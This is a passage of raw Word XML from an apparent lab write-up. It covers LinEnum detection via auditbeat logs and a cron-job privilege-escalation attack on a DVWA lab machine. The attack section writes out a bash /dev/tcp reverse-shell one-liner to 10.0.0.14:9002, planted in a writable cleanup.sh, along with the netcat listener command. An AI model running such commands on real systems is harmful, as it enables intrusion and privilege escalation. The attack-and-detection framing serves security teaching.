          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems it’s like schedule tasks on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009316E5" w:rsidRPr="001B1649" w:rsidRDefault="009316E5">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And we see in red there is some rule that runs from the user art every 3 minute and </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> running /bin/bash and the script cleanup.sh from the home path</w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aybe we can hijack this cleanup.sh with our command and execute that every 3 minutes and got reverse shell from the user art</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> let’s check how we can do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009316E5" w:rsidRDefault="009316E5" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00A71851" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A71851">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">               </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRDefault="00DF3E5B" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DF3E5B" w:rsidRPr="00A71851" w:rsidRDefault="009316E5" w:rsidP="00DF3E5B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="400E3543" wp14:editId="7C1E1C2F">
            <wp:extent cx="5486400" cy="3194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4050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A71851" w:rsidRDefault="009316E5" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here above we got log </w:t>
      </w:r>
      <w:r w:rsidR="00D728B1">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">about the activity of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D728B1">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, this log shows the time when the attacker running </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we can see new process started with the name of the file LinEnum.sh and the user that running this file which www-data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">This log comes from Ubuntu which also installed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F13A9" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F13A9" w:rsidRDefault="003F13A9" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F13A9" w:rsidRDefault="003F13A9" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E7245A" w:rsidRDefault="00E7245A" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRPr="00944C35" w:rsidRDefault="00D728B1" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Cronjob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attack</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B35918" w:rsidRDefault="00B35918" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06AF6EFF" wp14:editId="1341EAE8">
            <wp:extent cx="4589850" cy="22189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8405" cy="2247267"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0065416F" w:rsidRDefault="00E07C28">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack will start first by the attacker looking for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjobs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is programs and files that running </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>automatically</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, very similar to schedule task windows systems. </w:t>
      </w:r>
      <w:r w:rsidR="00C9330C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">For the attacker </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="00C9330C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> great options to </w:t>
      </w:r>
      <w:r w:rsidR="00EA66CC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>escalate</w:t>
      </w:r>
      <w:r w:rsidR="00C9330C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> privileges maybe by hijacking </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C9330C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjobs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C9330C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> that running automaticity</w:t>
      </w:r>
      <w:r w:rsidR="0065416F">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRPr="00D728B1" w:rsidRDefault="0065416F" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>From the picture above, I marked in red we can see there is some script that running every 3 minutes by the user art</w:t>
      </w:r>
      <w:r w:rsidR="007653CD">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the name of the </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>script:</w:t>
      </w:r>
      <w:r w:rsidR="007653CD">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> cleanup.sh if this script is writable we can hijack this script let’s check how we can do that</w:t>
      </w:r>
      <w:r w:rsidR="00EA66CC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37DE662A" wp14:editId="6A02362B">
            <wp:extent cx="4519613" cy="18156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6286" cy="1826407"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRPr="001B1649" w:rsidRDefault="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Now</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the picture above we move to the path /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>/www/html/DVWA and we first</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> do</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘ls’ and we don’t see the file cleanup.sh so the next step I use the command: echo 'bash -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&amp; /dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">/10.0.0.14/9002 0&gt;&amp;1' &gt; cleanup.sh which is reverse shell one liner on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems and this command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">will write </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">to the file cleanup.sh which this script that we saw from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjobs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and this file should run automaticity every 3 minutes.  so now we hijack cleanup.sh and let’s try catch reverse shell from the target and this time from the user art which is much more good than www-data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">in red above on the picture the one liner reverse shell point to 10.0.0.14 which is the attacker machine and on port 9002 which we will use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to catch that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58C259D4" wp14:editId="32FD0324">
            <wp:extent cx="3212593" cy="11811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6023" cy="1211773"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we run the command </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nvlp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9002 which turn on listener on the attacker machine and we wait 3 minutes for the cleanup.sh file that runs automatic from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjobs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the user art let’s see if we can get the reverse shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRPr="001B1649" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75F8E823" wp14:editId="68EE8FAE">
            <wp:extent cx="5486400" cy="1448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448435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">It Works! We got the reverse shell back to our attacker machine from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cronjob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> that runs cleanup.sh every 3 minutes, and now from the picture above we can see now we got shell from the user art which means we escalate privileges from www-data to art good job now need to check how we can get the root on this machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00D728B1" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D728B1">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Cronjob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attack Detection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B76C7B" w:rsidRDefault="00B76C7B" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009F7A67" w:rsidRDefault="00B76C7B" w:rsidP="00D728B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="443D4AF0" wp14:editId="5A6951D5">
            <wp:extent cx="5486400" cy="2484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484755"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D728B1" w:rsidRDefault="00B76C7B" w:rsidP="00B76C7B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="405"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
